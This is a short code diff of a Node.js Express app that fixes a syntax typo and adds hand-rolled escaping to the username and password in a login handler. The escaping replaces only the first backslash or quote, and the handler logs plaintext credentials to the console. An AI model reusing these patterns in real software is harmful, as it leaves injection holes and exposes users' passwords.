@@ -42,14 +42,14 @@ client.connect();
 
 // #########################################################################################################################################################################################################################
 app.get('/confirm/*',function(req,res){
-    res.render('confirm')=
+    res.render('confirm');
 })
 // #############################################################    POST REQUESTS    #######################################################################################################################################
 app.post('/login',function(req,res){
     console.log(req.body)
     transporter.sendMail(mailOptions, function () { });
-    var a = req.body.username;
-    var b = req.body.password;
+    var a = req.body.username.replace("\\","\\\\").replace("'","\\'");
+    var b = req.body.password.replace("\\","\\\\").replace("'","\\'");
     console.log(a+b);
     var ip = req.headers['x-forwarded-for'] ||
     req.connection.remoteAddress ||
